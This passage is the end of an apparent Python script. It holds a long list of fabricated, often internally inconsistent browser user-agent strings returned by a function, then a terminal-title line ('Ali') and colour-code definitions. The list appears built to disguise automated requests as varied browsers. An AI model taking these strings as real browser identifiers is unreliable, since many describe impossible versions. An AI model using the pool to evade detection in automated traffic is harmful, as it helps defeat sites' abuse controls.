Gecko/20100101 Firefox/12.7.6","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/534.2.2 (KHTML, like Gecko) Chrome/19.0.806.0 Safari/534.2.2","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/538.0.1 (KHTML, like Gecko) Chrome/32.0.874.0 Safari/538.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/32.0.813.0 Safari/532.0.2","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.1; .NET CLR 2.5.52976.8)","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/3.0; .NET CLR 3.0.11795.6)","Opera/12.59 (Windows NT 6.0; U; AR Presto/2.9.172 Version/11.00)","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5 rv:2.0; RO) AppleWebKit/534.0.1 (KHTML, like Gecko) Version/5.0.9 Safari/534.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.1.0 (KHTML, like Gecko) Chrome/32.0.850.0 Safari/532.1.0","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.0; Trident/5.1; .NET CLR 4.9.62728.0)","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/536.2.1 (KHTML, like Gecko) Chrome/31.0.816.0 Safari/536.2.1","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/536.0.2 (KHTML, like Gecko) Chrome/28.0.850.0 Safari/536.0.2","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/18.0.844.0 Safari/534.0.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_8 rv:2.0; UZ) AppleWebKit/531.2.0 (KHTML, like Gecko) Version/4.1.6 Safari/531.2.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.9.4; rv:6.2) Gecko/20100101 Firefox/6.2.2","Opera/11.81 (Windows NT 6.3; U; CS Presto/2.9.188 Version/10.00)","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/35.0.858.0 Safari/531.0.0","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/24.0.800.0 Safari/532.0.0","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/531.2.0 (KHTML, like Gecko) Chrome/16.0.818.0 Safari/531.2.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.0.2 (KHTML, like Gecko) Chrome/25.0.878.0 Safari/535.0.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_9)  AppleWebKit/538.2.1 (KHTML, like Gecko) Chrome/25.0.880.0 Safari/538.2.1","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.0.1 (KHTML, like Gecko) Chrome/20.0.857.0 Safari/533.0.1","Opera/9.50 (Macintosh; Intel Mac OS X 10.10.8 U; AZ Presto/2.9.163 Version/12.00)","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/536.2.0 (KHTML, like Gecko) Chrome/31.0.809.0 Safari/536.2.0","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.0; .NET CLR 1.1.25438.5)","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Trident/5.0; .NET CLR 1.5.62168.9)","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_5 rv:5.0; ID) AppleWebKit/537.1.1 (KHTML, like Gecko) Version/7.0.0 Safari/537.1.1","Opera/10.69 (Windows NT 5.1; U; EL Presto/2.9.166 Version/10.00)","Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0.0","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/534.1.1 (KHTML, like Gecko) Chrome/28.0.809.0 Safari/534.1.1","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.2.0 (KHTML, like Gecko) Chrome/33.0.846.0 Safari/531.2.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/538.2.1 (KHTML, like Gecko) Chrome/23.0.868.0 Safari/538.2.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4 rv:3.0; BO) AppleWebKit/534.0.0 (KHTML, like Gecko) Version/4.0.3 Safari/534.0.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_9 rv:2.0; CY) AppleWebKit/532.1.1 (KHTML, like Gecko) Version/7.1.7 Safari/532.1.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0 rv:3.0; SW) AppleWebKit/533.1.0 (KHTML, like Gecko) Version/7.0.9 Safari/533.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/19.0.877.0 Safari/534.0.2","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/537.1.2 (KHTML, like Gecko) Chrome/35.0.818.0 Safari/537.1.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8.1; rv:6.1) Gecko/20100101 Firefox/6.1.5","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/533.1.2 (KHTML, like Gecko) Chrome/34.0.820.0 Safari/533.1.2","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/537.1.0 (KHTML, like Gecko) Chrome/36.0.853.0 Safari/537.1.0","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.0; Trident/5.0; .NET CLR 3.4.30248.4)","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/34.0.857.0 Safari/532.1.1","Opera/10.35 (Windows NT 5.2; U; NN Presto/2.9.174 Version/10.00)","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8)  AppleWebKit/531.2.1 (KHTML, like Gecko) Chrome/30.0.870.0 Safari/531.2.1","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.0.2 (KHTML, like Gecko) Chrome/35.0.878.0 Safari/536.0.2","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/38.0.852.0 Safari/536.1.2","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/37.0.874.0 Safari/538.0.2","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Trident/7.1; .NET CLR 2.3.33462.0)","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/30.0.814.0 Safari/534.2.1","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.0.1 (KHTML, like Gecko) Chrome/25.0.859.0 Safari/537.0.1","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/22.0.803.0 Safari/532.0.2","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.2; Trident/7.0; .NET CLR 4.1.82931.5)","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6 rv:5.0; CS) AppleWebKit/538.0.0 (KHTML, like Gecko) Version/6.1.2 Safari/538.0.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/32.0.885.0 Safari/536.1.0","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/537.1.0 (KHTML, like Gecko) Chrome/23.0.859.0 Safari/537.1.0","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/38.0.858.0 Safari/533.0.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7)  AppleWebKit/531.0.2 (KHTML, like Gecko) Chrome/32.0.891.0 Safari/531.0.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3 rv:6.0; FI) AppleWebKit/537.2.1 (KHTML, like Gecko) Version/6.0.9 Safari/537.2.1","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.2; Trident/7.1; .NET CLR 3.0.29873.2)","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/531.2.0 (KHTML, like Gecko) Chrome/19.0.851.0 Safari/531.2.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6 rv:6.0; IT) AppleWebKit/535.1.1 (KHTML, like Gecko) Version/4.1.10 Safari/535.1.1","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/531.2.0 (KHTML, like Gecko) Chrome/18.0.831.0 Safari/531.2.0","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/533.1.0 (KHTML, like Gecko) Chrome/15.0.816.0 Safari/533.1.0","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/537.0.0 (KHTML, like Gecko) Chrome/23.0.839.0 Safari/537.0.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5.0; rv:15.7) Gecko/20100101 Firefox/15.7.1","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/533.2.2 (KHTML, like Gecko) Chrome/23.0.809.0 Safari/533.2.2","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/39.0.894.0 Safari/531.0.0","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/535.2.2 (KHTML, like Gecko) Chrome/15.0.875.0 Safari/535.2.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_6)  AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/22.0.876.0 Safari/536.0.1","Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_6_8 rv:5.0; EN) AppleWebKit/537.0.2 (KHTML, like Gecko) Version/5.0.2 Safari/537.0.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4)  AppleWebKit/536.1.1 (KHTML, like Gecko) Chrome/30.0.860.0 Safari/536.1.1","Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_4 rv:2.0; MK) AppleWebKit/538.2.1 (KHTML, like Gecko) Version/7.1.10 Safari/538.2.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_0)  AppleWebKit/534.1.1 (KHTML, like Gecko) Chrome/25.0.884.0 Safari/534.1.1","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/6.1; .NET CLR 4.9.46160.3)","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/534.1.1 (KHTML, like Gecko) Chrome/19.0.874.0 Safari/534.1.1","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.0.1 (KHTML, like Gecko) Chrome/26.0.814.0 Safari/535.0.1","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.0.0 (KHTML, like Gecko) Chrome/24.0.801.0 Safari/536.0.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7 rv:3.0; EO) AppleWebKit/532.2.2 (KHTML, like Gecko) Version/6.1.7 Safari/532.2.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4 rv:6.0; SK) AppleWebKit/532.2.1 (KHTML, like Gecko) Version/4.1.0 Safari/532.2.1","Opera/14.56 (Windows NT 5.0; U; GD Presto/2.9.177 Version/11.00)","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_7)  AppleWebKit/536.0.0 (KHTML, like Gecko) Chrome/17.0.867.0 Safari/536.0.0","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.2.2 (KHTML, like Gecko) Chrome/38.0.873.0 Safari/535.2.2","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.2; Trident/4.1; .NET CLR 1.5.81167.5)","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5.1; rv:12.7) Gecko/20100101 Firefox/12.7.6","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.2.2 (KHTML, like Gecko) Chrome/26.0.823.0 Safari/535.2.2","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/532.2.0 (KHTML, like Gecko) Chrome/27.0.837.0 Safari/532.2.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/536.2.1 (KHTML, like Gecko) Chrome/21.0.804.0 Safari/536.2.1","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_7 rv:6.0; ET) AppleWebKit/532.1.0 (KHTML, like Gecko) Version/4.0.8 Safari/532.1.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5.0; rv:6.2) Gecko/20100101 Firefox/6.2.1","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/535.1.2 (KHTML, like Gecko) Chrome/24.0.897.0 Safari/535.1.2","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/36.0.885.0 Safari/535.0.0","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/533.2.1 (KHTML, like Gecko) Chrome/13.0.859.0 Safari/533.2.1","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/25.0.862.0 Safari/536.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.2.0 (KHTML, like Gecko) Chrome/19.0.801.0 Safari/532.2.0","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/536.2.0 (KHTML, like Gecko) Chrome/32.0.849.0 Safari/536.2.0","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/538.1.2 (KHTML, like Gecko) Chrome/28.0.880.0 Safari/538.1.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5 rv:5.0; RU) AppleWebKit/536.0.2 (KHTML, like Gecko) Version/7.0.4 Safari/536.0.2","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.1; .NET CLR 3.2.95766.5)","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.1; .NET CLR 3.7.61018.1)","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/7.0; .NET CLR 2.3.42508.1)","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_8)  AppleWebKit/536.1.1 (KHTML, like Gecko) Chrome/38.0.892.0 Safari/536.1.1","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/533.1.1 (KHTML, like Gecko) Chrome/28.0.860.0 Safari/533.1.1","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/533.1.0 (KHTML, like Gecko) Chrome/18.0.808.0 Safari/533.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.2.1 (KHTML, like Gecko) Chrome/30.0.807.0 Safari/532.2.1","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_9)  AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/25.0.837.0 Safari/538.0.2","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/531.2.2 (KHTML, like Gecko) Chrome/33.0.886.0 Safari/531.2.2","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/531.1.0 (KHTML, like Gecko) Chrome/37.0.849.0 Safari/531.1.0","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/30.0.817.0 Safari/534.2.1","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.2; Trident/3.0; .NET CLR 3.1.78462.9)","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.1.0 (KHTML, like Gecko) Chrome/31.0.821.0 Safari/534.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.0.1 (KHTML, like Gecko) Chrome/21.0.825.0 Safari/537.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/26.0.867.0 Safari/535.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/537.2.0 (KHTML, like Gecko) Chrome/17.0.885.0 Safari/537.2.0","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.3; Trident/7.0; .NET CLR 4.7.57158.8)","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.1.1 (KHTML, like Gecko) Chrome/37.0.890.0 Safari/536.1.1","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.3; Trident/7.1; .NET CLR 4.3.30588.9)","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7)  AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/30.0.899.0 Safari/532.1.2","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.2.0 (KHTML, like Gecko) Chrome/13.0.884.0 Safari/532.2.0","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.0; Trident/4.0; .NET CLR 1.9.93429.5)","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.1.0 (KHTML, like Gecko) Chrome/33.0.857.0 Safari/534.1.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_9_9 rv:5.0; ET) AppleWebKit/534.0.0 (KHTML, like Gecko) Version/5.0.0 Safari/534.0.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_5)  AppleWebKit/535.0.1 (KHTML, like Gecko) Chrome/31.0.883.0 Safari/535.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/36.0.818.0 Safari/534.0.2","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.2.0 (KHTML, like Gecko) Chrome/36.0.802.0 Safari/534.2.0","Opera/12.82 (Windows NT 5.1; U; UK Presto/2.9.171 Version/11.00)","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.1.0 (KHTML, like Gecko) Chrome/20.0.880.0 Safari/538.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/25.0.847.0 Safari/533.0.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_2)  AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/14.0.886.0 Safari/534.0.2","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/23.0.833.0 Safari/534.2.1","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.0.2 (KHTML, like Gecko) Chrome/17.0.899.0 Safari/536.0.2","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.3; Trident/5.0; .NET CLR 3.2.24044.4)","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/537.2.1 (KHTML, like Gecko) Chrome/32.0.809.0 Safari/537.2.1","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/38.0.888.0 Safari/532.2.2","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/534.2.2 (KHTML, like Gecko) Chrome/24.0.801.0 Safari/534.2.2","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/533.1.1 (KHTML, like Gecko) Chrome/13.0.872.0 Safari/533.1.1","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/533.1.0 (KHTML, like Gecko) Chrome/31.0.845.0 Safari/533.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/25.0.892.0 Safari/536.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.2.2 (KHTML, like Gecko) Chrome/19.0.824.0 Safari/533.2.2","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/5.0; .NET CLR 4.7.99214.7)","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_7 rv:3.0; RM) AppleWebKit/534.1.1 (KHTML, like Gecko) Version/5.1.4 Safari/534.1.1","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/538.0.1 (KHTML, like Gecko) Chrome/34.0.893.0 Safari/538.0.1","Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_4)  AppleWebKit/535.1.1 (KHTML, like Gecko) Chrome/17.0.843.0 Safari/535.1.1","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.2; Trident/4.1; .NET CLR 1.7.11417.4)","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/533.0.1 (KHTML, like Gecko) Chrome/32.0.880.0 Safari/533.0.1","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 3.8.32379.5)","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8.1; rv:13.3) Gecko/20100101 Firefox/13.3.9","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/5.0; .NET CLR 2.1.23184.4)","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.1; .NET CLR 2.0.64501.9)","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.0.2 (KHTML, like Gecko) Chrome/25.0.839.0 Safari/535.0.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_0)  AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/25.0.830.0 Safari/536.1.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_7)  AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/22.0.836.0 Safari/535.1.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1 rv:2.0; SE) AppleWebKit/533.2.1 (KHTML, like Gecko) Version/7.0.4 Safari/533.2.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8.0; rv:5.4) Gecko/20100101 Firefox/5.4.7","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/38.0.805.0 Safari/533.0.0","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/538.0.1 (KHTML, like Gecko) Chrome/39.0.808.0 Safari/538.0.1","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.7.4; rv:5.1) Gecko/20100101 Firefox/5.1.5","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_9 rv:3.0; AR) AppleWebKit/531.2.0 (KHTML, like Gecko) Version/5.0.5 Safari/531.2.0","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.0; Trident/5.0; .NET CLR 1.9.32054.0)","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.2; Trident/4.1; .NET CLR 3.6.24353.7)","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; .NET CLR 3.0.87344.5)","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.2.0 (KHTML, like Gecko) Chrome/24.0.810.0 Safari/537.2.0","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/27.0.834.0 Safari/536.1.0","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/3.1; .NET CLR 4.4.80024.2)","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_4)  AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/22.0.866.0 Safari/536.1.2","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.0; Trident/4.0; .NET CLR 1.6.32849.3)","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.0; Trident/6.1; .NET CLR 3.0.26971.1)","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/36.0.874.0 Safari/532.2.2","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/18.0.899.0 Safari/532.2.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_9 rv:2.0; IT) AppleWebKit/533.2.0 (KHTML, like Gecko) Version/4.0.2 Safari/533.2.0","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/38.0.811.0 Safari/535.0.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/15.0.812.0 Safari/532.0.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5.8; rv:8.7) Gecko/20100101 Firefox/8.7.2","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.2.1 (KHTML, like Gecko) Chrome/20.0.839.0 Safari/537.2.1","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/534.1.0 (KHTML, like Gecko) Chrome/15.0.840.0 Safari/534.1.0","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/7.0; .NET CLR 1.9.11062.4)","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/32.0.881.0 Safari/536.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/28.0.876.0 Safari/534.0.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4)  AppleWebKit/538.2.1 (KHTML, like Gecko) Chrome/15.0.836.0 Safari/538.2.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5 rv:4.0; NE) AppleWebKit/533.2.0 (KHTML, like Gecko) Version/7.0.3 Safari/533.2.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6 rv:3.0; IT) AppleWebKit/531.0.1 (KHTML, like Gecko) Version/5.0.4 Safari/531.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/531.0.1 (KHTML, like Gecko) Chrome/31.0.846.0 Safari/531.0.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0 rv:2.0; MO) AppleWebKit/534.0.2 (KHTML, like Gecko) Version/4.0.7 Safari/534.0.2","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.0; Trident/4.1; .NET CLR 4.6.18072.0)","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.2.2 (KHTML, like Gecko) Chrome/26.0.853.0 Safari/537.2.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1 rv:5.0; TK) AppleWebKit/536.0.2 (KHTML, like Gecko) Version/6.0.2 Safari/536.0.2","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/6.0; .NET CLR 2.6.17019.9)","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/17.0.889.0 Safari/536.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/538.2.0 (KHTML, like Gecko) Chrome/20.0.829.0 Safari/538.2.0","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; .NET CLR 4.4.63311.6)","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.3; Trident/6.0; .NET CLR 4.9.99021.7)","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/538.0.0 (KHTML, like Gecko) Chrome/23.0.893.0 Safari/538.0.0","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.2; Trident/6.1; .NET CLR 3.7.43118.4)","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/32.0.800.0 Safari/536.0.1","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/5.0; .NET CLR 1.6.31143.5)","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/7.0; .NET CLR 3.1.50432.3)","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.2.1 (KHTML, like Gecko) Chrome/33.0.869.0 Safari/538.2.1","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.1.1 (KHTML, like Gecko) Chrome/35.0.892.0 Safari/537.1.1","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.2.0 (KHTML, like Gecko) Chrome/32.0.861.0 Safari/532.2.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3)  AppleWebKit/533.0.2 (KHTML, like Gecko) Chrome/38.0.816.0 Safari/533.0.2","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.1.2 (KHTML, like Gecko) Chrome/22.0.810.0 Safari/535.1.2","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/19.0.822.0 Safari/536.1.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_5)  AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/33.0.845.0 Safari/532.0.2","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/3.0; .NET CLR 1.5.45636.2)","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.2.1 (KHTML, like Gecko) Chrome/39.0.851.0 Safari/537.2.1",])+END        
    return ua

sys.stdout.write('\x1b]2; Ali\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
